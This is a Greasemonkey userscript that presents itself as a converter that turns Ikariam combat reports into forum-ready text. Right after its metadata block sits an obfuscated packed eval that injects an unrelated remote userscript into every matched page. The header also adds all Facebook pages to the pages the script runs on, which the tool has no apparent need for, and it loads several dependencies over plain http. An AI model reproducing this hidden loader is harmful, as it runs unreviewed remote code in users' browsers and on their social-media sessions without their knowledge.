// ==UserScript==
// @name           Ikariam CR Converter Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      holyschmidt
// @author         holyschmidt (http://userscripts.org/users/50784)
// @license        GNU GPL v3 (http://www.gnu.org/copyleft/gpl.html)
// @homepage       http://userscripts.org/scripts/show/50784
// @description    Easily Convert Combat Reports for forum viewing.
// @version        4.07
// @downloadURL    https://userscripts.org/scripts/source/50784.user.js
// @updateURL      https://userscripts.org/scripts/source/50784.meta.js
// @include        http://s*.ikariam.*/index.php*
// @include        http://m*.ikariam.*/index.php*
// @require        http://www.betawarriors.com/bin/gm/jquerymin.js
// @require        http://www.betawarriors.com/bin/gm/57377user.js
// @require        http://www.betawarriors.com/bin/gm/57756user.js
// @require        http://www.betawarriors.com/bin/gm/62718user.js 
// @require        http://tools.betawarriors.com/js/ikcrc/CrcLanguage.js?v=4.07&mode=ALL
// @require        http://tools.betawarriors.com/js/ikcrc/CrcFormatter.js?v=4.07
// @require        http://tools.betawarriors.com/js/ikcrc/CrcEngine.js?v=4.07
// @exclude        http://board.ikariam.*/*
// @exclude        http://support*.ikariam.*/*
//
// @history        4.07 Bugfix: Updated for v0.5.3 (resource parsing issue)
// @history        4.06 Bugfix: Coloring issue fixed.
// @history        4.05 Bugfix: Error viewing more than the first detailed battle report shown.
// @history        4.04 Support for "mobile" versions of Ikariam.
// @history        4.03 Bugfix: Defender's losses not shown correctly in detailed CRs
// @history        4.02 Bugfix: report not getting reset before new "convert".  Req'd for ajax implementation.
// @history        4.01 Fixed language detection bug (thanks Apollo for the heads up)
// @history        4.01 Script update mechanism updated for new meta tag functionality.
// @history        4.01 Tweaked some of the watchdog defaults to be more lenient in how long it takes to bring up an ajax view.
// @history        4.00 Updated for v0.5.x
// @history        4.00 Some re-design, to provide more common source code between the web and client-side converters.
// @history        4.00 Deprecated "PlunderUtils".
// @history        4.00 Deprecated "manual" changes, as this was only to address a defect in an old version of IKA.
// @history        4.00 Deprecated turning on/off preview (always on).
// @history        4.00 Deprecated HTML formatting for converted (HTML) combat reports (use "plaintext").
// @history        3.18 Bugfix: Wrong damage being calculated for v0.4.4
// @history        3.17 Simiplied jQuery for getting reserve units.
// @history        3.17 Initial update for 0.4.5 (still need translations for new ships).
// @history        3.16 Bugfix: Display NaN for "Damage Percent" for the reports with no damage.
// @history        3.15 Bugfix: Not working quite right on test server (v0.4.X).
// @history        3.14 Feature: Added new mechanism for report summary "metrics" with two new entries: 
// @history        3.14 Feature: Added two new report "metrics": 1. Offensive/Defensive Points 2. Damage Percent
// @history        3.14 Removed all remaining dependencies to control location on betawarriors.com
// @history        3.13 Bugfix: Ikariam v0.4.2.4 broke the summary converter.
// @history        3.12 Moved old dependencies to new (controlled) location.
// @history        3.10 Tweak: Modified default color scheme to be more conducive to the new Ikariam forum.
// @history        3.09 Feature: Added (optional) setting to automatically include "spoiler" tag in bbcode reports.
// @history        3.08 Bugfix: Problem when sending detailed reports via circular messages.
// @history        3.08 Bugfix: Problem with images in in-game messages.
// @history        3.07 Bugfix: Problem in the type of battlefield parsed in detailed view which led to "undefined" units.
// @history        3.06 Feature Removal: Removed garrison icon on island view (I think there was a bug here anyway).
// @history        3.05 Feature: Added unit names to event actions (PlayerX has joined the battle with...) (thanks hotcarbu)
// @history        3.04 Bugfix: Problem with determining land vs sea battle (thanks Martynius).
// @history        3.03 Bugfix: Gameforge changed how '&' were stored, which broke reports sent in-game with the circular option.
// @history        3.02 Feature: Added checkbox for turning on/off report preview + images.
// @history        3.02 Bugfix: Commas were not added to damage, etc.
// @history        3.02 Bugfix: Force-edit of reports added back in.
// @history        3.00 Overhaul: Code re-design.
// @history        3.00 Feature: New Settings dialog.
// @history        3.00 Feature: New "html" option for rich-text email messages.
// @history        3.00 Feature: Support for individual round reports.
// @history        3.00 Feature: Hiding zero-moral lines in detailed view.
// @history        3.00 Feature: Show garrison button added for towns with deployed troops/fleet (thanks Wiisley).

// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


VERSION = "4.07";

try {
	// v0.4.x or MOBILE
	var headHTML = document.getElementsByTagName('head')[0].innerHTML;
	CrcLanguage.lang = headHTML.match(/LocalizationStrings\[\'language\'\]\s+=\s\'(.+)\';/)[1];
} catch(e) {}
if (typeof CrcLanguage.lang === "undefined") {
	try {
	// v0.5.x
	var pageHTML = document.documentElement.innerHTML;
	CrcLanguage.lang = pageHTML.match(/LocalizationStrings\s=.+\"language\"\:\"([a-z]+)\"/)[1];
	} catch(e) {}
}
if (typeof CrcLanguage.lang === "undefined") {
	CrcLanguage.lang = "en";
}

Config.prefix = document.domain;
Config.reloadOnSave = false;
Config.scriptName = "Ikariam CR Converter";
Config.callback = function() {
	if ($('#militaryAdvisorReportView,#militaryAdvisorDetailedReportView').size() > 0) {
		CrcConverter.createReport();
	}
};
Config.tabs = {
	"Options":{
		html:'<p>Combat Report Converter configuration settings.</p>',
		fields:{
			convertFormat:{
				type:"select",
				label:"Format",
				options:{
					"ajaxchat":"ajaxchat",
					"bbcode":"bbcode",
					"html":"html",
					"plaintext":"plaintext",
				},
				text:'output format of the converter combat report?',
				value:"plaintext",
			},
			enableColor: { type:'checkbox', label:'Color', text:'should colors be displayed in the report?', value:true },
			enableEvents: { type:'checkbox', label:'Events', text:'should events be displayed in the report?', value:true },
			enableImages: { type:'checkbox', label:'Images', text:'should images be displayed in the report?', value:true },
			enableSpoiler: { type:'checkbox', label:'Spoiler Tags', text:'add spoiler tags around report', value:true },
			crColorsScene: { type:"text", label:"Scene > Color", text:'what color is the scene?', value:"000070" },
			crColorsAttackers: { type:"text", label:"Attackers > Color", text:'what color is the units attacking?', value:"700000" },
			crColorsDefenders: { type:"text", label:"Defenders > Color", text:'what color is the units defending?', value:"007000" },
			crColorsLeft: { type:"text", label:"Units Left > Color", text:'what color is the units left?', value:"000000" },
			crColorsLost: { type:"text", label:"Units Lost > Color", text:'what color is the units lost?', value:"A00000" },
			crColorsVictor: { type:"text", label:"Victor > Color", text:'what color is the victor(s)?', value:"000070" },
			crColorsEvents: { type:"text", label:"Events > Color", text:'what color is the events?', value:"444444" },
		},
	},
	"About":{
		html:'	<p>' +
				'<a href="http://userscripts.org/scripts/show/50784" target="_blank" style="font-weight:bold !important;">' + 
				Config.scriptName + ' v' + VERSION + '</a> by <a href="http://userscripts.org/users/holyschmidt" target="_blank">holyschmidt</a>\
				<p>This script parses combat report details (units remaining/lost, resources, winners, etc) and converts report into a format for display </p>',
	}
};

Settings = {
	get:function(key) {  return Config.get(key); },
	set:function(key, value) { Config.set(key, value); },
};

Styles = {
	add:function(css) {
		GM_addStyle(css);
	},
	addCustomEvents:function() {
		// Setup events to change color of input box for CR colors, if adjustment is made
		$("input[id*='crColors']").live('click', function() { Styles.colorShow(this); });
		$("input[id*='crColors']").live('keyup', function() { Styles.colorShow(this); });
		$("#ikcrcPlayPen textarea").click(function() { this.select(); });
	},
	addPlayPen:function(selector) {
		if($('#ikcrcPlayPen').size() == 0) {
			// Add required styles 
			Styles.add(
				"#ikcrcPlayPen { margin:0 auto 10px auto; }" +
				"#ikcrcSettings { margin:auto 5px; position:relative; float:right; color:#FF0000; }" +
				"#ikcrcSettings:hover { text-decoration:underline; cursor:pointer; }" +
				"#ikcrcVersion { position:relative; float:left; margin-left:5px;}" +
				"#ikcrcEnables { position:relative; float:right; margin-top:6px; }" +
				"#ikcrcPlayPen span.ikcrcFormats { position:relative; float:left; margin:5px; }" +
				"#ikcrcPlayPen textarea { font-family: courier; width:97%; margin:7px; }");
			// Build intial playpen 
			$(selector).append(	
			'<div id="ikcrcPlayPen" class="contentBox01h">' +
				'<h3 class="header">' +
					'<span id="ikcrcVersion">' +
						'<span>v.' + VERSION + '</span>' +
					'</span>' +
					'<span id="ikcrcSettings" title="Show/Hide Settings Window">Settings</span>Ikariam Combat Report Converter' + '</h3>' + 
				'<div class="content">' + 
					'<span id="ikcrcOptions"></span>' +
					'<textarea rows="5" readonly="readonly"></textarea>' + 
					'<div class="footer"></div>' +
				'</div>' +
			'</div>');	
			// Setup event to open settings dialog.
			$("#ikcrcSettings").click(function() { Config.show(); });
			// Add preview area.
			$('#ikcrcPlayPen div.footer').before('<div style="margin:1em;" id="ikcrcPlayPenPreview"></div>');
			$('#ikcrcPlayPenPreview').hide();
			// Listen for format changes
			$("span.ikcrcFormats input").live('click', function() { 
				Settings.set('convertFormat', this.value); 
				CrcConverter.createReport();
			});	
			// Listen for event changes
			$("#ikcrcEnables input").live('click', function() {
				Settings.set(this.name, this.checked ? 1 : 0); 
				CrcConverter.createReport();
			});
		}
		
		// Add/update format options 
		$("#ikcrcOptions .ikcrcFormats").remove();
		for (var format in CrcFormatter.Defaults.Formats) {
			var checked = format == Settings.get('convertFormat') ? ' checked="checked"' : ''; 
			$("#ikcrcOptions").append(
				'<span class="ikcrcFormats"><input type="radio" name="ikcrcFormat" value="' + format + '"' + checked + '> ' + format + ' </span>'
			);
		}
		// Add/update converter enables
		$("#ikcrcOptions #ikcrcEnables").remove();
		var ena_color = Settings.get('enableColor') ? 'checked="checked"' : ''; 
		var ena_events = Settings.get('enableEvents') ? 'checked="checked"' : '';
		var ena_images = Settings.get('enableImages') ? 'checked="checked"' : ''; 
		var ena_spoiler = Settings.get('enableSpoiler') ? 'checked="checked"' : '';
		$("#ikcrcOptions").append('<span id="ikcrcEnables">' +
			'<input name="enableColor" id="check_colors" type="checkbox" ' + ena_color + '/>&nbsp;Color&nbsp;&nbsp;' +
			'<input name="enableEvents" id="check_events" type="checkbox" ' + ena_events + '/>&nbsp;Events&nbsp;&nbsp;' +
			'<input name="enableImages" id="check_images" type="checkbox" ' + ena_images + '/>&nbsp;Images&nbsp;&nbsp;' +
			'<input name="enableSpoiler" id="check_spoiler" type="checkbox" ' + ena_spoiler + '/>&nbsp;Spoiler&nbsp;&nbsp;' +
		'</span>');
	},
	colorShow:function(obj) {
		var bg = obj.value.toUpperCase();
		var fg = Styles.colorReverse(bg);
		$(obj).attr('style', 'color:#' + fg + '; background-color:#' + bg);
	},
	colorReverse:function(c) {
		var result=''; var ch=''; var list1='0123456789ABCDEF'; var list2='FEDCBA9876543210';
		for(var i=0;i<c.length;i++) { ch=c.charAt(i); for(var n=0;n<list1.length;n++){ if(ch==list1.charAt(n)) result += list2.charAt(n); } }
		return result;		
	},
};

// Override for using local color scheme.
CrcFormatter.ReplaceColors = function(report) { 
	if (this.format == "ajaxchat") {
		report = report.replace(/IKCRC_UNITLOST/g,    'red');
		report = report.replace(/IKCRC_ATTACKING/g,   'red');
		report = report.replace(/IKCRC_DEFENDING/g,   'green');
		report = report.replace(/IKCRC_UNITRESERVE/g, 'gray');
	}
	else {
		report = report.replace(/IKCRC_UNITLEFT/g,    Settings.get('crColorsLeft'));
		report = report.replace(/IKCRC_UNITLOST/g,    Settings.get('crColorsLost'));
		report = report.replace(/IKCRC_UNITRESERVE/g, Settings.get('crColorsLeft'));
		report = report.replace(/IKCRC_ATTACKING/g,   Settings.get('crColorsAttackers'));
		report = report.replace(/IKCRC_DEFENDING/g,   Settings.get('crColorsDefenders'));
		report = report.replace(/IKCRC_HEADER/g,      Settings.get('crColorsScene'));
		report = report.replace(/IKCRC_VICTOR/g,      Settings.get('crColorsVictor'));
		report = report.replace(/IKCRC_EVENTS/g,      Settings.get('crColorsScene'));
	}
	return report;
};

CrcConverter = {
	report:null,
	root:undefined,
	previewOn:false,
	init:function() {
        this.source_name = "Ikariam Cr Converter";
        this.source_link = "http://userscripts.org/scripts/show/50784";
		// Deprecated "circular" option for "plaintext".
		if (Settings.get('convertFormat') == 'circular') {
			Settings.set('convertFormat', 'plaintext');
		}
		CrcFormatter.init();
		if ($('#militaryAdvisorReportView,#militaryAdvisorDetailedReportView').size() > 0) {
			this.createReport();
		}
		else {
			var version = $('.version').text().replace(/(\r\n|\n|\r|\s)/gm, '').substr(0, 4);
			if (version == "v0.5") {
				$("a[href*='view=militaryAdvisorReportView']").live("click", function() { 
					AjaxWatchdog('militaryAdvisorReportView', function() { 
						CrcConverter.createReport();
					});
				});
				$("a[href*='view=militaryAdvisorDetailedReportView']").live("click", function() { 
					setTimeout(function() {
						AjaxWatchdog('militaryAdvisorDetailedReportView', function() { 
							CrcConverter.createReport();
						});
					}, 2000);
				});
			}
		}
	},
	createReport:function() { 
		// Setup formatter with current settings.
		CrcFormatter.colorize = Settings.get('enableColor');
		CrcFormatter.images = Settings.get('enableImages');
		CrcFormatter.spoiler = Settings.get('enableSpoiler');
		CrcFormatter.format = Settings.get('convertFormat');
		// Add the "playpen" for display of the converted report.
		if ($('#militaryAdvisorReportView').size() > 0) {
			Styles.addPlayPen($('#troopsReport'));
		}
		else if ($('#militaryAdvisorDetailedReportView').size() > 0) {
			Styles.addPlayPen($('#battlefield').parent());
		}
		// Parse the combat report.
		this.report = CrcEngine.ParseReport($('body')); 
		// Create the report for the requested format.
		var results = CrcEngine.BuildReport(CrcFormatter, this.report, Settings.get('enableEvents'))
			.replace(/&lt;/g, '<')
			.replace(/&gt;/g, '>'); 
		// Spit out the results 
		$('#ikcrcPlayPen textarea').val(CrcFormatter.ReplaceColors(results));
		// Create the report for the preview.
		var currentFormat = CrcFormatter.format;
		CrcFormatter.format = 'html';
		preview = CrcEngine.BuildReport(CrcFormatter, this.report, Settings.get('enableEvents'));
		CrcFormatter.format = currentFormat;
		$('#ikcrcPlayPenPreview').html(CrcFormatter.ReplaceColors(preview.replace(/\n/g, '<br>')));
		$('#ikcrcPlayPenPreview').show();
		
		Styles.addCustomEvents();
		AjaxResize();
	},
};

AjaxResize = function() {
	var evt = document.createEvent('UIEvents');
	evt.initUIEvent('resize', true, false, window, 0);
	window.dispatchEvent(evt);
};

AjaxWatchdog = function(id, callback, retry, interval) {
	retry = typeof retry !== 'undefined' ? retry : 8;
	interval = typeof interval !== 'undefined' ? interval : 500;
	if ($("#" + id).size() > 0) {
		if (callback != null && typeof(callback) == "function") {
			callback();
		}
	}
	else if (retry >= 0) {
		setTimeout(function() { 
			AjaxWatchdog(id, callback, retry--, interval);
		}, interval);
	}
	else {
		console.log(id + ' never found!');
	}
};

IkaTools.addOptionsLink(Config.scriptName);
CrcConverter.init();